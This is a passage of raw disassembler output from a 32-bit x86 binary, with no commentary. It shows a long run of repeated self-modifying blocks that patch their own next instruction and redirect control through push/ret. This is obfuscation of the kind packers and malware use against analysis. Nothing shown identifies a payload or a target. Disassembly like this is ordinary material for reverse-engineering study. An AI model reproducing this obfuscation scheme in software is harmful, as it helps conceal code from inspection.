  40dd33:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40dd37:	66 87 05 2d dd 40 00 	xchg   %ax,0x40dd2d
  40dd3e:	b8 c9 23 e2 73       	mov    $0x73e223c9,%eax
  40dd43:	87 04 24             	xchg   %eax,(%esp)
  40dd46:	c3                   	ret
  40dd47:	8f 05 75 dd 40 00    	pop    0x40dd75
  40dd4d:	50                   	push   %eax
  40dd4e:	90                   	nop
  40dd4f:	b8 15 20 40 00       	mov    $0x402015,%eax
  40dd54:	8d 80 8c 54 17 40    	lea    0x4017548c(%eax),%eax
  40dd5a:	87 05 63 dd 40 00    	xchg   %eax,0x40dd63
  40dd60:	58                   	pop    %eax
  40dd61:	f3 90                	pause
  40dd63:	7b eb                	jnp    0x40dd50
  40dd65:	bf ca 00 50 66       	mov    $0x665000ca,%edi
  40dd6a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dd6f:	05 63 dd 40 00       	add    $0x40dd63,%eax
  40dd74:	b8 67 42 2d e6       	mov    $0xe62d4267,%eax
  40dd79:	87 04 24             	xchg   %eax,(%esp)
  40dd7c:	c3                   	ret
  40dd7d:	8f 05 ac dd 40 00    	pop    0x40ddac
  40dd83:	50                   	push   %eax
  40dd84:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dd8a:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40dd90:	87 05 99 dd 40 00    	xchg   %eax,0x40dd99
  40dd96:	58                   	pop    %eax
  40dd97:	f3 90                	pause
  40dd99:	93                   	xchg   %eax,%ebx
  40dd9a:	2c e7                	sub    $0xe7,%al
  40dd9c:	17                   	pop    %ss
  40dd9d:	40                   	inc    %eax
  40dd9e:	00 50 66             	add    %dl,0x66(%eax)
  40dda1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dda6:	05 99 dd 40 00       	add    $0x40dd99,%eax
  40ddab:	b8 46 6c e0 c1       	mov    $0xc1e06c46,%eax
  40ddb0:	8d 40 01             	lea    0x1(%eax),%eax
  40ddb3:	87 04 24             	xchg   %eax,(%esp)
  40ddb6:	c3                   	ret
  40ddb7:	8f 05 e5 dd 40 00    	pop    0x40dde5
  40ddbd:	50                   	push   %eax
  40ddbe:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ddc4:	8d 80 d3 21 0c ff    	lea    -0xf3de2d(%eax),%eax
  40ddca:	87 05 d3 dd 40 00    	xchg   %eax,0x40ddd3
  40ddd0:	58                   	pop    %eax
  40ddd1:	f3 90                	pause
  40ddd3:	2c a1                	sub    $0xa1,%al
  40ddd5:	2f                   	das
  40ddd6:	ee                   	out    %al,(%dx)
  40ddd7:	ff 50 66             	call   *0x66(%eax)
  40ddda:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40dddf:	05 d3 dd 40 00       	add    $0x40ddd3,%eax
  40dde4:	b8 73 8d f0 e1       	mov    $0xe1f08d73,%eax
  40dde9:	87 04 24             	xchg   %eax,(%esp)
  40ddec:	c3                   	ret
  40dded:	8f 05 1c de 40 00    	pop    0x40de1c
  40ddf3:	50                   	push   %eax
  40ddf4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40ddfa:	8d 80 ea e5 33 57    	lea    0x5733e5ea(%eax),%eax
  40de00:	87 05 09 de 40 00    	xchg   %eax,0x40de09
  40de06:	58                   	pop    %eax
  40de07:	f3 90                	pause
  40de09:	64 6a 93             	fs push $0xffffff93
  40de0c:	5b                   	pop    %ebx
  40de0d:	40                   	inc    %eax
  40de0e:	00 50 66             	add    %dl,0x66(%eax)
  40de11:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40de16:	05 09 de 40 00       	add    $0x40de09,%eax
  40de1b:	b8 fa cf b4 cb       	mov    $0xcbb4cffa,%eax
  40de20:	8d 40 01             	lea    0x1(%eax),%eax
  40de23:	87 04 24             	xchg   %eax,(%esp)
  40de26:	c3                   	ret
  40de27:	8f 05 55 de 40 00    	pop    0x40de55
  40de2d:	50                   	push   %eax
  40de2e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40de34:	8d 80 53 df bf ff    	lea    -0x4020ad(%eax),%eax
  40de3a:	87 05 43 de 40 00    	xchg   %eax,0x40de43
  40de40:	58                   	pop    %eax
  40de41:	f3 90                	pause
  40de43:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40de44:	d2 4a 1c             	rorb   %cl,0x1c(%edx)
  40de47:	ff 50 66             	call   *0x66(%eax)
  40de4a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40de4f:	05 43 de 40 00       	add    $0x40de43,%eax
  40de54:	b8 5f bb 0e 0b       	mov    $0xb0ebb5f,%eax
  40de59:	87 04 24             	xchg   %eax,(%esp)
  40de5c:	c3                   	ret
  40de5d:	8f 05 8c de 40 00    	pop    0x40de8c
  40de63:	50                   	push   %eax
  40de64:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40de6a:	8d 80 76 f5 33 50    	lea    0x5033f576(%eax),%eax
  40de70:	87 05 79 de 40 00    	xchg   %eax,0x40de79
  40de76:	58                   	pop    %eax
  40de77:	f3 90                	pause
  40de79:	c0 46 1d 8f          	rolb   $0x8f,0x1d(%esi)
  40de7d:	40                   	inc    %eax
  40de7e:	00 50 66             	add    %dl,0x66(%eax)
  40de81:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40de86:	05 79 de 40 00       	add    $0x40de79,%eax
  40de8b:	b8 68 ec 1b 89       	mov    $0x891bec68,%eax
  40de90:	8d 40 01             	lea    0x1(%eax),%eax
  40de93:	87 04 24             	xchg   %eax,(%esp)
  40de96:	c3                   	ret
  40de97:	8f 05 c5 de 40 00    	pop    0x40dec5
  40de9d:	50                   	push   %eax
  40de9e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dea4:	8d 80 d3 d8 05 ff    	lea    -0xfa272d(%eax),%eax
  40deaa:	87 05 b3 de 40 00    	xchg   %eax,0x40deb3
  40deb0:	58                   	pop    %eax
  40deb1:	f3 90                	pause
  40deb3:	63 fb                	arpl   %edi,%ebx
  40deb5:	d9 c1                	fld    %st(1)
  40deb7:	ff 50 66             	call   *0x66(%eax)
  40deba:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40debf:	05 b3 de 40 00       	add    $0x40deb3,%eax
  40dec4:	b8 37 9d 5c bf       	mov    $0xbf5c9d37,%eax
  40dec9:	87 04 24             	xchg   %eax,(%esp)
  40decc:	c3                   	ret
  40decd:	8f 05 fc de 40 00    	pop    0x40defc
  40ded3:	50                   	push   %eax
  40ded4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40deda:	8d 80 7a e5 33 57    	lea    0x5733e57a(%eax),%eax
  40dee0:	87 05 e9 de 40 00    	xchg   %eax,0x40dee9
  40dee6:	58                   	pop    %eax
  40dee7:	f3 90                	pause
  40dee9:	c5 46 8a             	lds    -0x76(%esi),%eax
  40deec:	56                   	push   %esi
  40deed:	40                   	inc    %eax
  40deee:	00 50 66             	add    %dl,0x66(%eax)
  40def1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40def6:	05 e9 de 40 00       	add    $0x40dee9,%eax
  40defb:	b8 41 a6 b0 d6       	mov    $0xd6b0a641,%eax
  40df00:	8d 40 01             	lea    0x1(%eax),%eax
  40df03:	87 04 24             	xchg   %eax,(%esp)
  40df06:	c3                   	ret
  40df07:	8f 05 35 df 40 00    	pop    0x40df35
  40df0d:	50                   	push   %eax
  40df0e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40df14:	8d 80 6e 5c e4 03    	lea    0x3e45c6e(%eax),%eax
  40df1a:	87 05 23 df 40 00    	xchg   %eax,0x40df23
  40df20:	58                   	pop    %eax
  40df21:	f3 90                	pause
  40df23:	04 b3                	add    $0xb3,%al
  40df25:	2b 67 00             	sub    0x0(%edi),%esp
  40df28:	50                   	push   %eax
  40df29:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40df2d:	66 87 05 23 df 40 00 	xchg   %ax,0x40df23
  40df34:	b8 96 cb 43 c1       	mov    $0xc143cb96,%eax
  40df39:	87 04 24             	xchg   %eax,(%esp)
  40df3c:	c3                   	ret
  40df3d:	8f 05 6b df 40 00    	pop    0x40df6b
  40df43:	50                   	push   %eax
  40df44:	90                   	nop
  40df45:	b8 15 20 40 00       	mov    $0x402015,%eax
  40df4a:	8d 80 53 df bf ff    	lea    -0x4020ad(%eax),%eax
  40df50:	87 05 59 df 40 00    	xchg   %eax,0x40df59
  40df56:	58                   	pop    %eax
  40df57:	f3 90                	pause
  40df59:	03 da                	add    %edx,%ebx
  40df5b:	5f                   	pop    %edi
  40df5c:	a3 ff 50 66 b8       	mov    %eax,0xb86650ff
  40df61:	eb e8                	jmp    0x40df4b
  40df63:	66 87 05 59 df 40 00 	xchg   %ax,0x40df59
  40df6a:	b8 67 41 33 c6       	mov    $0xc6334167,%eax
  40df6f:	87 04 24             	xchg   %eax,(%esp)
  40df72:	c3                   	ret
  40df73:	8f 05 a1 df 40 00    	pop    0x40dfa1
  40df79:	50                   	push   %eax
  40df7a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40df80:	8d 80 d3 dc 04 ff    	lea    -0xfb232d(%eax),%eax
  40df86:	87 05 8f df 40 00    	xchg   %eax,0x40df8f
  40df8c:	58                   	pop    %eax
  40df8d:	f3 90                	pause
  40df8f:	3b 49 4b             	cmp    0x4b(%ecx),%ecx
  40df92:	b6 ff                	mov    $0xff,%dh
  40df94:	50                   	push   %eax
  40df95:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40df99:	66 87 05 8f df 40 00 	xchg   %ax,0x40df8f
  40dfa0:	b8 8a 2c f4 86       	mov    $0x86f42c8a,%eax
  40dfa5:	87 04 24             	xchg   %eax,(%esp)
  40dfa8:	c3                   	ret
  40dfa9:	8f 05 d7 df 40 00    	pop    0x40dfd7
  40dfaf:	50                   	push   %eax
  40dfb0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40dfb6:	8d 80 6e 5c e4 1b    	lea    0x1be45c6e(%eax),%eax
  40dfbc:	87 05 c5 df 40 00    	xchg   %eax,0x40dfc5
  40dfc2:	58                   	pop    %eax
  40dfc3:	f3 90                	pause
  40dfc5:	1d 97 f9 93 00       	sbb    $0x93f997,%eax
  40dfca:	50                   	push   %eax
  40dfcb:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40dfcf:	66 87 05 c5 df 40 00 	xchg   %ax,0x40dfc5
  40dfd6:	b8 3b f8 66 5f       	mov    $0x5f66f83b,%eax
  40dfdb:	87 04 24             	xchg   %eax,(%esp)
  40dfde:	c3                   	ret
  40dfdf:	8f 05 0d e0 40 00    	pop    0x40e00d
  40dfe5:	50                   	push   %eax
  40dfe6:	90                   	nop
  40dfe7:	b8 15 20 40 00       	mov    $0x402015,%eax
  40dfec:	8d 80 d3 20 17 ff    	lea    -0xe8df2d(%eax),%eax
  40dff2:	87 05 fb df 40 00    	xchg   %eax,0x40dffb
  40dff8:	58                   	pop    %eax
  40dff9:	f3 90                	pause
  40dffb:	8f a9 f5 b4          	(bad)
  40dfff:	ff 50 66             	call   *0x66(%eax)
  40e002:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e007:	05 fb df 40 00       	add    $0x40dffb,%eax
  40e00c:	b8 95 10 20 dd       	mov    $0xdd201095,%eax
  40e011:	87 04 24             	xchg   %eax,(%esp)
  40e014:	c3                   	ret
  40e015:	8f 05 43 e0 40 00    	pop    0x40e043
  40e01b:	50                   	push   %eax
  40e01c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e022:	8d 80 d3 ea 16 ff    	lea    -0xe9152d(%eax),%eax
  40e028:	87 05 31 e0 40 00    	xchg   %eax,0x40e031
  40e02e:	58                   	pop    %eax
  40e02f:	f3 90                	pause
  40e031:	66 a3 0c e7 ff 50    	mov    %ax,0x50ffe70c
  40e037:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e03b:	66 87 05 31 e0 40 00 	xchg   %ax,0x40e031
  40e042:	b8 d6 03 9b ea       	mov    $0xea9b03d6,%eax
  40e047:	87 04 24             	xchg   %eax,(%esp)
  40e04a:	c3                   	ret
  40e04b:	8f 05 7a e0 40 00    	pop    0x40e07a
  40e051:	50                   	push   %eax
  40e052:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e058:	8d 80 76 f5 87 56    	lea    0x5687f576(%eax),%eax
  40e05e:	87 05 67 e0 40 00    	xchg   %eax,0x40e067
  40e064:	58                   	pop    %eax
  40e065:	f3 90                	pause
  40e067:	6a ed                	push   $0xffffffed
  40e069:	10 95 40 00 50 66    	adc    %dl,0x66500040(%ebp)
  40e06f:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e074:	05 67 e0 40 00       	add    $0x40e067,%eax
  40e079:	b8 b0 49 2f 5c       	mov    $0x5c2f49b0,%eax
  40e07e:	8d 40 01             	lea    0x1(%eax),%eax
  40e081:	87 04 24             	xchg   %eax,(%esp)
  40e084:	c3                   	ret
  40e085:	8f 05 b4 e0 40 00    	pop    0x40e0b4
  40e08b:	50                   	push   %eax
  40e08c:	90                   	nop
  40e08d:	b8 15 20 40 00       	mov    $0x402015,%eax
  40e092:	8d 80 ea 15 34 57    	lea    0x573415ea(%eax),%eax
  40e098:	87 05 a1 e0 40 00    	xchg   %eax,0x40e0a1
  40e09e:	58                   	pop    %eax
  40e09f:	f3 90                	pause
  40e0a1:	a0 6f 92 a5 40       	mov    0x40a5926f,%al
  40e0a6:	00 50 66             	add    %dl,0x66(%eax)
  40e0a9:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e0ae:	05 a1 e0 40 00       	add    $0x40e0a1,%eax
  40e0b3:	b8 1d 11 1f 68       	mov    $0x681f111d,%eax
  40e0b8:	8d 40 01             	lea    0x1(%eax),%eax
  40e0bb:	87 04 24             	xchg   %eax,(%esp)
  40e0be:	c3                   	ret
  40e0bf:	8f 05 ed e0 40 00    	pop    0x40e0ed
  40e0c5:	50                   	push   %eax
  40e0c6:	90                   	nop
  40e0c7:	b8 15 20 40 00       	mov    $0x402015,%eax
  40e0cc:	8d 80 d3 e0 15 ff    	lea    -0xea1f2d(%eax),%eax
  40e0d2:	87 05 db e0 40 00    	xchg   %eax,0x40e0db
  40e0d8:	58                   	pop    %eax
  40e0d9:	f3 90                	pause
  40e0db:	25 cf 51 b5 ff       	and    $0xffb551cf,%eax
  40e0e0:	50                   	push   %eax
  40e0e1:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e0e5:	66 87 05 db e0 40 00 	xchg   %ax,0x40e0db
  40e0ec:	b8 e6 0b de 11       	mov    $0x11de0be6,%eax
  40e0f1:	87 04 24             	xchg   %eax,(%esp)
  40e0f4:	c3                   	ret
  40e0f5:	8f 05 23 e1 40 00    	pop    0x40e123
  40e0fb:	50                   	push   %eax
  40e0fc:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e102:	8d 80 d3 fa 14 ff    	lea    -0xeb052d(%eax),%eax
  40e108:	87 05 11 e1 40 00    	xchg   %eax,0x40e111
  40e10e:	58                   	pop    %eax
  40e10f:	f3 90                	pause
  40e111:	53                   	push   %ebx
  40e112:	04 a6                	add    $0xa6,%al
  40e114:	53                   	push   %ebx
  40e115:	ff 50 66             	call   *0x66(%eax)
  40e118:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e11d:	05 11 e1 40 00       	add    $0x40e111,%eax
  40e122:	b8 64 a2 19 ce       	mov    $0xce19a264,%eax
  40e127:	87 04 24             	xchg   %eax,(%esp)
  40e12a:	c3                   	ret
  40e12b:	8f 05 59 e1 40 00    	pop    0x40e159
  40e131:	50                   	push   %eax
  40e132:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e138:	8d 80 d3 24 04 ff    	lea    -0xfbdb2d(%eax),%eax
  40e13e:	87 05 47 e1 40 00    	xchg   %eax,0x40e147
  40e144:	58                   	pop    %eax
  40e145:	f3 90                	pause
  40e147:	43                   	inc    %ebx
  40e148:	5c                   	pop    %esp
  40e149:	98                   	cwtl
  40e14a:	3f                   	aas
  40e14b:	ff 50 66             	call   *0x66(%eax)
  40e14e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e153:	05 47 e1 40 00       	add    $0x40e147,%eax
  40e158:	b8 01 20 0b 63       	mov    $0x630b2001,%eax
  40e15d:	87 04 24             	xchg   %eax,(%esp)
  40e160:	c3                   	ret
  40e161:	8f 05 8f e1 40 00    	pop    0x40e18f
  40e167:	50                   	push   %eax
  40e168:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e16e:	8d 80 53 e5 bf ff    	lea    -0x401aad(%eax),%eax
  40e174:	87 05 7d e1 40 00    	xchg   %eax,0x40e17d
  40e17a:	58                   	pop    %eax
  40e17b:	f3 90                	pause
  40e17d:	52                   	push   %edx
  40e17e:	0d 26 ef 00 50       	or     $0x5000ef26,%eax
  40e183:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e187:	66 87 05 7d e1 40 00 	xchg   %ax,0x40e17d
  40e18e:	b8 cb aa fa 30       	mov    $0x30faaacb,%eax
  40e193:	87 04 24             	xchg   %eax,(%esp)
  40e196:	c3                   	ret
  40e197:	8f 05 c5 e1 40 00    	pop    0x40e1c5
  40e19d:	50                   	push   %eax
  40e19e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e1a4:	8d 80 d3 b8 03 ff    	lea    -0xfc472d(%eax),%eax
  40e1aa:	87 05 b3 e1 40 00    	xchg   %eax,0x40e1b3
  40e1b0:	58                   	pop    %eax
  40e1b1:	f3 90                	pause
  40e1b3:	b5 62                	mov    $0x62,%ch
  40e1b5:	2f                   	das
  40e1b6:	3e ff 50 66          	notrack call *0x66(%eax)
  40e1ba:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e1bf:	05 b3 e1 40 00       	add    $0x40e1b3,%eax
  40e1c4:	b8 88 4d 00 d6       	mov    $0xd6004d88,%eax
  40e1c9:	87 04 24             	xchg   %eax,(%esp)
  40e1cc:	c3                   	ret
  40e1cd:	8f 05 fb e1 40 00    	pop    0x40e1fb
  40e1d3:	50                   	push   %eax
  40e1d4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e1da:	8d 80 d3 82 03 ff    	lea    -0xfc7d2d(%eax),%eax
  40e1e0:	87 05 e9 e1 40 00    	xchg   %eax,0x40e1e9
  40e1e6:	58                   	pop    %eax
  40e1e7:	f3 90                	pause
  40e1e9:	0d b2 6c 70 ff       	or     $0xff706cb2,%eax
  40e1ee:	50                   	push   %eax
  40e1ef:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e1f3:	66 87 05 e9 e1 40 00 	xchg   %ax,0x40e1e9
  40e1fa:	b8 e3 88 a0 75       	mov    $0x75a088e3,%eax
  40e1ff:	87 04 24             	xchg   %eax,(%esp)
  40e202:	c3                   	ret
  40e203:	8f 05 31 e2 40 00    	pop    0x40e231
  40e209:	50                   	push   %eax
  40e20a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e210:	8d 80 d3 9c 00 ff    	lea    -0xff632d(%eax),%eax
  40e216:	87 05 1f e2 40 00    	xchg   %eax,0x40e21f
  40e21c:	58                   	pop    %eax
  40e21d:	f3 90                	pause
  40e21f:	87 9f 92 35 ff 50    	xchg   %ebx,0x50ff3592(%edi)
  40e225:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e229:	66 87 05 1f e2 40 00 	xchg   %ax,0x40e21f
  40e230:	b8 cd 0e 42 ec       	mov    $0xec420ecd,%eax
  40e235:	87 04 24             	xchg   %eax,(%esp)
  40e238:	c3                   	ret
  40e239:	8f 05 67 e2 40 00    	pop    0x40e267
  40e23f:	50                   	push   %eax
  40e240:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e246:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40e24c:	87 05 55 e2 40 00    	xchg   %eax,0x40e255
  40e252:	58                   	pop    %eax
  40e253:	f3 90                	pause
  40e255:	7e d2                	jle    0x40e229
  40e257:	ae                   	scas   %es:(%edi),%al
  40e258:	c5 00                	lds    (%eax),%eax
  40e25a:	50                   	push   %eax
  40e25b:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e25f:	66 87 05 55 e2 40 00 	xchg   %ax,0x40e255
  40e266:	b8 fa fa 1d 7b       	mov    $0x7b1dfafa,%eax
  40e26b:	87 04 24             	xchg   %eax,(%esp)
  40e26e:	c3                   	ret
  40e26f:	8f 05 9d e2 40 00    	pop    0x40e29d
  40e275:	50                   	push   %eax
  40e276:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e27c:	8d 80 d3 20 02 ff    	lea    -0xfddf2d(%eax),%eax
  40e282:	87 05 8b e2 40 00    	xchg   %eax,0x40e28b
  40e288:	58                   	pop    %eax
  40e289:	f3 90                	pause
  40e28b:	2f                   	das
  40e28c:	f4                   	hlt
  40e28d:	28 33                	sub    %dh,(%ebx)
  40e28f:	ff 50 66             	call   *0x66(%eax)
  40e292:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e297:	05 8b e2 40 00       	add    $0x40e28b,%eax
  40e29c:	b8 ec df be 2c       	mov    $0x2cbedfec,%eax
  40e2a1:	87 04 24             	xchg   %eax,(%esp)
  40e2a4:	c3                   	ret
  40e2a5:	8f 05 d3 e2 40 00    	pop    0x40e2d3
  40e2ab:	50                   	push   %eax
  40e2ac:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e2b2:	8d 80 d3 fa fe fe    	lea    -0x101052d(%eax),%eax
  40e2b8:	87 05 c1 e2 40 00    	xchg   %eax,0x40e2c1
  40e2be:	58                   	pop    %eax
  40e2bf:	f3 90                	pause
  40e2c1:	a2 9e c1 c5 ff       	mov    %al,0xffc5c19e
  40e2c6:	50                   	push   %eax
  40e2c7:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e2cb:	66 87 05 c1 e2 40 00 	xchg   %ax,0x40e2c1
  40e2d2:	b8 a2 ad 27 97       	mov    $0x9727ada2,%eax
  40e2d7:	87 04 24             	xchg   %eax,(%esp)
  40e2da:	c3                   	ret
  40e2db:	8f 05 09 e3 40 00    	pop    0x40e309
  40e2e1:	50                   	push   %eax
  40e2e2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e2e8:	8d 80 d3 14 02 ff    	lea    -0xfdeb2d(%eax),%eax
  40e2ee:	87 05 f7 e2 40 00    	xchg   %eax,0x40e2f7
  40e2f4:	58                   	pop    %eax
  40e2f5:	f3 90                	pause
  40e2f7:	fa                   	cli
  40e2f8:	82 2d 97 ff 50 66 b8 	subb   $0xb8,0x6650ff97
  40e2ff:	eb e8                	jmp    0x40e2e9
  40e301:	66 87 05 f7 e2 40 00 	xchg   %ax,0x40e2f7
  40e308:	b8 66 79 5d 86       	mov    $0x865d7966,%eax
  40e30d:	87 04 24             	xchg   %eax,(%esp)
  40e310:	c3                   	ret
  40e311:	8f 05 3f e3 40 00    	pop    0x40e33f
  40e317:	50                   	push   %eax
  40e318:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e31e:	8d 80 d3 8e ff fe    	lea    -0x100712d(%eax),%eax
  40e324:	87 05 2d e3 40 00    	xchg   %eax,0x40e32d
  40e32a:	58                   	pop    %eax
  40e32b:	f3 90                	pause
  40e32d:	45                   	inc    %ebp
  40e32e:	7c a3                	jl     0x40e2d3
  40e330:	3a ff                	cmp    %bh,%bh
  40e332:	50                   	push   %eax
  40e333:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e337:	66 87 05 2d e3 40 00 	xchg   %ax,0x40e32d
  40e33e:	b8 76 c7 e7 be       	mov    $0xbee7c776,%eax
  40e343:	87 04 24             	xchg   %eax,(%esp)
  40e346:	c3                   	ret
  40e347:	8f 05 75 e3 40 00    	pop    0x40e375
  40e34d:	50                   	push   %eax
  40e34e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e354:	8d 80 d3 48 01 ff    	lea    -0xfeb72d(%eax),%eax
  40e35a:	87 05 63 e3 40 00    	xchg   %eax,0x40e363
  40e360:	58                   	pop    %eax
  40e361:	f3 90                	pause
  40e363:	08 12                	or     %dl,(%edx)
  40e365:	c7                   	(bad)
  40e366:	a0 ff 50 66 b8       	mov    0xb86650ff,%al
  40e36b:	eb e8                	jmp    0x40e355
  40e36d:	66 87 05 63 e3 40 00 	xchg   %ax,0x40e363
  40e374:	b8 b5 cb 1b e4       	mov    $0xe41bcbb5,%eax
  40e379:	87 04 24             	xchg   %eax,(%esp)
  40e37c:	c3                   	ret
  40e37d:	8f 05 ab e3 40 00    	pop    0x40e3ab
  40e383:	50                   	push   %eax
  40e384:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e38a:	8d 80 d3 22 fe fe    	lea    -0x101dd2d(%eax),%eax
  40e390:	87 05 99 e3 40 00    	xchg   %eax,0x40e399
  40e396:	58                   	pop    %eax
  40e397:	f3 90                	pause
  40e399:	c1 4b 3e e1          	rorl   $0xe1,0x3e(%ebx)
  40e39d:	ff 50 66             	call   *0x66(%eax)
  40e3a0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e3a5:	05 99 e3 40 00       	add    $0x40e399,%eax
  40e3aa:	b8 a5 b8 6a c8       	mov    $0xc86ab8a5,%eax
  40e3af:	87 04 24             	xchg   %eax,(%esp)
  40e3b2:	c3                   	ret
  40e3b3:	8f 05 e1 e3 40 00    	pop    0x40e3e1
  40e3b9:	50                   	push   %eax
  40e3ba:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e3c0:	8d 80 d3 3c 01 ff    	lea    -0xfec32d(%eax),%eax
  40e3c6:	87 05 cf e3 40 00    	xchg   %eax,0x40e3cf
  40e3cc:	58                   	pop    %eax
  40e3cd:	f3 90                	pause
  40e3cf:	e2 bf                	loop   0x40e390
  40e3d1:	08 ff                	or     %bh,%bh
  40e3d3:	ff 50 66             	call   *0x66(%eax)
  40e3d6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e3db:	05 cf e3 40 00       	add    $0x40e3cf,%eax
  40e3e0:	b8 b5 ca 1c ea       	mov    $0xea1ccab5,%eax
  40e3e5:	87 04 24             	xchg   %eax,(%esp)
  40e3e8:	c3                   	ret
  40e3e9:	8f 05 17 e4 40 00    	pop    0x40e417
  40e3ef:	50                   	push   %eax
  40e3f0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e3f6:	8d 80 d3 b6 fe fe    	lea    -0x101492d(%eax),%eax
  40e3fc:	87 05 05 e4 40 00    	xchg   %eax,0x40e405
  40e402:	58                   	pop    %eax
  40e403:	f3 90                	pause
  40e405:	ae                   	scas   %es:(%edi),%al
  40e406:	12 5c d0 ff          	adc    -0x1(%eax,%edx,8),%bl
  40e40a:	50                   	push   %eax
  40e40b:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e40f:	66 87 05 05 e4 40 00 	xchg   %ax,0x40e405
  40e416:	b8 41 b5 1e 42       	mov    $0x421eb541,%eax
  40e41b:	87 04 24             	xchg   %eax,(%esp)
  40e41e:	c3                   	ret
  40e41f:	8f 05 50 e4 40 00    	pop    0x40e450
  40e425:	50                   	push   %eax
  40e426:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e42c:	8d 80 b2 24 e4 0f    	lea    0xfe424b2(%eax),%eax
  40e432:	87 05 3b e4 40 00    	xchg   %eax,0x40e43b
  40e438:	58                   	pop    %eax
  40e439:	f3 90                	pause
  40e43b:	56                   	push   %esi
  40e43c:	46                   	inc    %esi
  40e43d:	76 98                	jbe    0x40e3d7
  40e43f:	01 00                	add    %eax,(%eax)
  40e441:	00 00                	add    %al,(%eax)
  40e443:	50                   	push   %eax
  40e444:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e448:	66 87 05 3b e4 40 00 	xchg   %ax,0x40e43b
  40e44f:	b8 1e c5 36 61       	mov    $0x6136c51e,%eax
  40e454:	8d 40 03             	lea    0x3(%eax),%eax
  40e457:	87 04 24             	xchg   %eax,(%esp)
  40e45a:	c3                   	ret
  40e45b:	8f 05 8a e4 40 00    	pop    0x40e48a
  40e461:	50                   	push   %eax
  40e462:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e468:	8d 80 7a e5 33 57    	lea    0x5733e57a(%eax),%eax
  40e46e:	87 05 77 e4 40 00    	xchg   %eax,0x40e477
  40e474:	58                   	pop    %eax
  40e475:	f3 90                	pause
  40e477:	f9                   	stc
  40e478:	ec                   	in     (%dx),%al
  40e479:	30 7a 40             	xor    %bh,0x40(%edx)
  40e47c:	00 50 66             	add    %dl,0x66(%eax)
  40e47f:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e484:	05 77 e4 40 00       	add    $0x40e477,%eax
  40e489:	b8 f5 a8 ab ba       	mov    $0xbaaba8f5,%eax
  40e48e:	8d 40 01             	lea    0x1(%eax),%eax
  40e491:	87 04 24             	xchg   %eax,(%esp)
  40e494:	c3                   	ret
  40e495:	8f 05 c3 e4 40 00    	pop    0x40e4c3
  40e49b:	50                   	push   %eax
  40e49c:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e4a2:	8d 80 a5 30 10 40    	lea    0x401030a5(%eax),%eax
  40e4a8:	87 05 b1 e4 40 00    	xchg   %eax,0x40e4b1
  40e4ae:	58                   	pop    %eax
  40e4af:	f3 90                	pause
  40e4b1:	41                   	inc    %ecx
  40e4b2:	68 a8 7c 00 50       	push   $0x50007ca8
  40e4b7:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e4bb:	66 87 05 b1 e4 40 00 	xchg   %ax,0x40e4b1
  40e4c2:	b8 f2 9c fb 72       	mov    $0x72fb9cf2,%eax
